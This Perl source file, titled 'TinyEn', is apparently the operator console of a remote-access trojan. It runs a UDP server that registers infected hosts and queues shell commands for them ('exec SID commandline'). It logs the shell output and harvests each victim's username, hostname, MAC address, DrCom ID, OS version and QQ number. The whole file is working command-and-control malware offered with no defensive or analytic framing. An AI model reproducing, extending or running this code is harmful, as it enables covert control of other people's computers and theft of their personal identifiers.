#! /usr/bin/perl

use strict;
use threads;
use threads::shared;
use IO::Socket::INET;
use Encode;
use Switch;
use Data::Dumper;
use Time::Local;
use POSIX;
$| = 1;


use enum qw(RQ_COMMAND=1 RQ_HOSTINFO RQ_SETUID RQ_PING RQ_UNINSTALL RQ_HELLO=255);


use constant ALIVE_TIME => 20;
my %g_stb : shared;
my @log : shared;
my $exiting : shared = 0;
my $sock = new IO::Socket::INET (
		LocalPort => '8888',
		Proto => 'udp',
		) or die "ERROR in Socket Creation : $!\n";
my ($session_timer_thread,$sock_io_loop_thread);

# * cut after '\0'
sub to_cstr() {
	my $str = shift;
	return substr($str,0,index($str,"\0"));
}

sub split_2part {
	my $cmdline = shift;
	if($cmdline =~ m/^\s*([^\s]+)\s*(\s.*+|)$/) {
		my $cmd = $1;
		my $arg = $2;
		$arg =~ s/^\s*|\s*$//g;
		return ($cmd,$arg);
	} else {
		return ('','');
	}

}

sub log {
	my $log_str='';
	map {$log_str .= ' '.$_} @_;
	push @log,strftime('%m-%d %T',localtime(time)).$log_str;
}

sub request_cmdline {
	my ($st, $sid, $cmdline) = @_;
#our $sock;
	$sid = int($sid);
	lock($st);
	return undef if(!defined($st->{$sid}));
	my $cmd = decode('utf-8',$cmdline);
	$cmd = encode('utf-16le',$cmdline);
	#my $hispaddr = sockaddr_in($st->{$sid}{
	my $senddata = pack('LC',$sid,RQ_COMMAND).$cmd;
	#my $sockaddr = sockaddr_in($st->{$sid}{'port'},inet_aton($st->{$sid}{'ip'}));
	return 0 if(send($sock,$senddata, 0, $st->{$sid}{'peeraddr'}) == undef);
	return 1;
}

sub request_hostinfo {
	my ($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	return undef if(!exists($st->{$sid}));
	my $senddata = pack('LC',$sid,RQ_HOSTINFO);
	return 0 if(send($sock,$senddata, 0, $st->{$sid}{'peeraddr'}) == undef);
	return 1;

}

sub request_setuid {
	my ($st, $sid, $uid) = @_;
	$sid = int($sid);
	lock($st);
	return undef if(!defined $st->{$sid});
	my $senddata = pack('LCQ',$sid,RQ_SETUID,int($uid));
	return 0 if(send($sock,$senddata, 0, $st->{$sid}{'peeraddr'}) == undef);
	return 1;
}

sub request_ping {
	my ($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	return undef if(!defined $st->{$sid});
	my $senddata = pack('LC',$sid,RQ_PING);
	return 0 if(send($sock,$senddata, 0, $st->{$sid}{'peeraddr'}) == undef);
	return 1;
}

sub new_session {
#exit("new_session param error") if(@_ < 4);
	my ($st, $uid, $peer, $addr, $port) = @_;
	$uid = int($uid);
	my $max_len = 0xFFFFFFFE;
	lock($st);
	my @keys = keys %$st;
	my $sid;
	foreach $sid (@keys) {
		if($st->{$sid}{'uid'} == $uid) {
			#$st->{$sid}{'ip'} = $addr;
			#$st->{$sid}{'port'} = $port;
			$st->{$sid}{'time'} = time;
			$st->{$sid}{'peeraddr'} = $peer;
			return $sid;
		}
	}
#my $id = 0xFFFFFFFF;
	my $size = @keys;
	my $r = int(rand($max_len - $size));
	my $n = -1;
	if($size >= $max_len) {
		return undef;
	}

	foreach $sid (sort @keys) {
		if($sid > $r + $n + 1) {
			last;
		} else {
			$n ++;
		}		
	}
	$sid = $n < 0 ? $r : $keys[$n] + ($r - ($keys[$n] - $n) + 1);
	$sid = int($sid);
	#print Dumper($st);
	$st->{$sid} = shared_clone({uid => $uid, time => time, peeraddr=>$peer,task=>{},hostinfo=>{}});
#printf "sid = %d\n",$sid;
	return $sid;

}
=pod
sub is_valid_session {
	my ($st, $sid, $addr, $port) = @_;
	$sid = int($sid);
	lock($st);
	return undef if(!defined $st->{$sid});
	return undef if($addr != $st->{'ip'} || $port != $st->{'port'});
	return 1;
}
=cut


sub get_session_info {
	my ($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		return $st->{$sid};
	}
	return undef;
}

sub set_session_info {
	my ($st, $sid, $uname, $hname, $hardaddr, $drid, $osversion, $syssetupdate, $oicqid) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		#delete $st->{$sid}{'hostinfo'};
		$st->{$sid}{'hostinfo'} = shared_clone({
			username=>$uname,
			hostname=>$hname,
			hardaddr=>$hardaddr,
			drcomid=>$drid,
			osversion=>$osversion,
			syssetup=>$syssetupdate,
			oicqid=>$oicqid
		});
		
		return 1;
	}
	return undef;
}

sub exists_session_info {
	my($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		my $hostinfo = $st->{$sid}{'hostinfo'};
		return 1 if(scalar(keys(%$hostinfo))>0);
		return 0;
	}
	return undef;
}

sub print_session_info {
	my($st, $sid) = @_;
	if(defined $st->{$sid}) {
		printf("UserName:\t%s\nHostName:\t%s\nDrComID:\t%s\nOS Version:\t%d.%d\nSys Setup:\t%s\nQQ Number:\t%s\n",
			$st->{$sid}{'hostinfo'}{'username'},
			$st->{$sid}{'hostinfo'}{'hostname'},
			$st->{$sid}{'hostinfo'}{'drcomid'},
			reverse(unpack('AA',$st->{$sid}{'hostinfo'}{'osversion'})),
			strftime('%Y-%m-%d %T',localtime($st->{$sid}{'hostinfo'}{'syssetup'})),
			$st->{$sid}{'hostinfo'}{'oicqid'});
	}
	return undef;
}

sub set_session_cmdline {
	my($st, $sid, $cmdline) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		$st->{$sid}{'task'}{'cmdline'} = $cmdline;
		return 1;
	}
	return undef,"Session not exists";
}

sub get_session_cmdline {
	my($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		my $cmdline = $st->{$sid}{'task'}{'cmdline'};
		$st->{$sid}{'task'}{'cmdline'}=undef;
		return '' if(!defined $cmdline);
		return $cmdline;
	}
	return undef,"Session not exists";
}

sub set_session_keep {
	my($st, $sid, $keep) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		$st->{$sid}{'keep'} = $keep;
		if($keep == 1 && exists($st->{$sid}{'peeraddr'})) {
			&request_ping($st,$sid);
			print "Ping package sent.\n";
		}
	}
	return undef;
}


sub get_session_keep {
	my($st, $sid) = @_;
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		return $st->{$sid}{'keep'};
	}
	return undef;
}
sub get_session_peeraddr {
	my($st, $sid) = @_;
	lock($st);
	$sid = int($sid);
	lock($st);
	if(defined $st->{$sid}) {
		return ('','') if(!exists $st->{$sid}{'peeraddr'});
		my ($port,$ip) = sockaddr_in($st->{$sid}{'peeraddr'});
		$ip = inet_ntoa($ip);
		return ($ip,$port);
	}
	return undef;
}
sub print_svr_list {
	my $st = shift;
	lock($st);
	printf "%-8s %-15s %-5s %-12s %-6s %-1s\n","SID","IP","PORT","HNAME","WAIT","K";
	foreach my $sid (keys %$st) {
		my $uname = $st->{$sid}{'hostinfo'}{'username'};
		$uname = "" if(!$uname);
		my ($ip,$port) = &get_session_peeraddr($st,$sid);
		printf "%08X %-15s %-5s %-12s %-6d %-1s\n",
			int($sid),
			$ip,
			$port,
			$uname,
			time - $st->{$sid}{'time'},
			($st->{$sid}{'keep'} == 1 ? 'Y' : ' ');
	}

}

sub relet_session {
	my($st, $sid) = @_;
	lock($st);
	$sid = int($sid);
	return undef if(!defined $st->{$sid});
	$st->{$sid}{'time'} = time;
}

sub clear_all_session {
	my ($st) = shift;
	lock($st);
	$st = shared_clone({});
}
sub print_log {
	my $show_lines = 20;
	lock(@log);
	my ($start,$len);
	my $log_len = length(@log);
	if($#log+1 <= $show_lines) {
		$start = 0;
		$len = $#log + 1;
	} else {
		$start = $#log - $show_lines;
		$len = $show_lines;
	}
	for(my $i=$start; $i < $len; $i++) {
		print @log[$i]."\n";
	}

	printf "Total %d.\n", $#log + 1;
	
	
}

sub session_timer() {
	my $st = shift;
	while(1) {
		foreach my $sid (keys %$st) {
			lock($st);
			my $time = $st->{$sid}{'time'};
			my $ping_time = $st->{$sid}{'ping_time'};
			$ping_time = 0 if (!defined($ping_time));
			#printf "time %d pingtime %d\n",$time,$ping_time;
			if(&get_session_keep($st,$sid) && time-$time > 10 && time-$ping_time > 5) {
				&request_ping($st,$sid);
				{
					$st->{$sid}{'ping_time'} = time;
				}
			} elsif(time - $time > 30*60) {
				#$st->{$sid}{'ip'} = "off line";
				#$st->{$sid}{'port'} = undef;
				$st->{$sid}{'peeraddr'} = undef;
			}
			

		}
		for(1..2) {
			{
				lock($exiting);
				return if($exiting);
			}
			sleep(1);
		}
	}
}

sub sock_io_loop() {
	my $st = shift;
	my ($received_data);


	while(1) {
		my ($sid,$id,$data,$i);
		my $peeraddr = $sock->recv($received_data,1024);
		if(!defined($peeraddr)) {
			sleep(1);
			next;
		}
		($sid,$id) = unpack('LC',$received_data);
		&relet_session($st,$sid,$peeraddr) if ($sid != 0xFFFFFFFF);
		$data = '';
		map {$data .= sprintf("%c",$_); } unpack('@5C*',$received_data);
		#printf ("data len: %d\n",length($data));
		#printf "Len:%d SID:%X ID:%hhu\n",length($received_data),$sid,$id;
		#print "Data "; 
		#map {printf("%02hhX ",$_);} unpack('C*',$data);
		#print("\n");
		switch($id) {
			case RQ_HELLO {
				my $uid = unpack('Q',$data);
				#printf "UID: %llX\n",$uid;
				if($sid == 0xFFFFFFFF) {
					$sid = &new_session($st,$uid,$peeraddr,"","");
					if($sid == undef) {
						print "Create session error.\n"
					}
				} else {
					print "hello package invalid!\n";
				}

			}
			case RQ_COMMAND {
				my $resp = decode('UTF-16le',$data);
				$resp = &to_cstr($resp);
				&log($sid." Shell result:".$resp);
			}
			case RQ_HOSTINFO {
#map {$uname.=} unpack('C16',$data);
				my $uname = substr($data,0,32);
				my $hname = substr($data,32,32);
				my $hardaddr = substr($data,64,6);
				my ($drid,$osversion,$syssetup,$oicqid) = unpack('@70a12SLA12',$data);
				$uname = decode('UTF-16le',$uname);
				$hname = decode('UTF-16le',$hname);
				$uname = &to_cstr($uname);
				$hname = &to_cstr($hname);
				$drid = &to_cstr($drid);
				$oicqid = &to_cstr($oicqid);
				&set_session_info($st,$sid,$uname,$hname,$hardaddr,$drid,$osversion,$syssetup,$oicqid);
				&log($sid,"Hostinfo",$uname,$hname,$oicqid);
				#print Dumper(\%g_stb);
			}
			case RQ_SETUID {
				warn("setuid");
			}
			case RQ_PING {
			}
			else {
				warn("unknow: $id");
			}
		}

		{
			#printf ("sid = %X\n",$sid);
			my ($cmdline,$err) = &get_session_cmdline($st,int($sid));
			if($cmdline ne "") {
				&request_cmdline($st,$sid,$cmdline);
			} elsif(!&exists_session_info($st,$sid)) {
				&request_hostinfo($st,$sid);
			} else {
			}
			
		}
	}
}

sub usage {
	print <<EOT
usage:
  exec SID commandline
  info SID
  all
  log
  save
  open
  help
  quit

EOT
}

#$g_stb{'log'} = shared_clone({});

$session_timer_thread = threads->new(\&session_timer,\%g_stb);
$sock_io_loop_thread = threads->new(\&sock_io_loop,\%g_stb);
print "TinyEn\n\n";
for(;;) {
	print "# ";
	my $line = <STDIN>;
	my ($cmd,$arg) = &split_2part ($line);
	if($cmd) {
		#printf "cmd=%s arg=%s\n",$cmd,$arg;
		if ($cmd eq "info") {
			if($arg =~ m/^([0-9abcdef]{8})\b$/i) {
				my $sid = hex($1);
				&print_session_info(\%g_stb,$sid);
				
			} else {
				printf "'%s' is not a valid sid.\n",$arg;
			}

		} elsif ($cmd eq "all") {
			&print_svr_list(\%g_stb);
		} elsif ($cmd eq "exec" || $cmd eq "!") {
			my ($sid,$cmdline) = &split_2part($arg);
			if(!$sid) {
				print "Can not find sid\n";
			} elsif(!$cmdline) {
				print "Command line must be speciafied.\n";
			} else {
				if($sid =~ m/^([0-9abcdef]{8})\b/i) {
					$sid = hex($sid);
					&set_session_cmdline(\%g_stb,$sid,$cmdline);
					print "Task added\n";
				} else {
					printf "'%s' is not a valid sid.\n",$sid;
				}
			}
		} elsif ($cmd eq "keep") {
			my ($sid,$keep) = &split_2part($arg);
			if($sid !~ m/^[0-9abcdef]{8}\b/i) {
				print "'sid' must be speciafied.\n";
			} elsif($keep !~m/^1$|^0$/) {
				print "a bool(1/0) arg must be speciafied.\n";
			} else {
				if($sid =~ m/^[0-9abcdef]{8}$/i) {
					my $sid = hex($sid);
					$keep = int($keep);
					&set_session_keep(\%g_stb,$sid,$keep);
				} else {
					printf "'%s' is not a valid sid.\n",$sid;
				}
			}
		} elsif ($cmd eq "log") {
			&print_log();
		} elsif ($cmd eq "save") {
			&log("abc");
			print "unsupported.\n"
		} elsif ($cmd eq "open") {
			print "unsupported.\n"
		} elsif ($cmd eq "help") {
			&usage;
		} elsif ($cmd eq "quit") {
			last;
		} else {
			printf "'%s' command not found\n",$cmd;
		}
	}
}
#$session_timer_thread->join;
#$sock_io_loop_thread->join;
$sock->close(); 


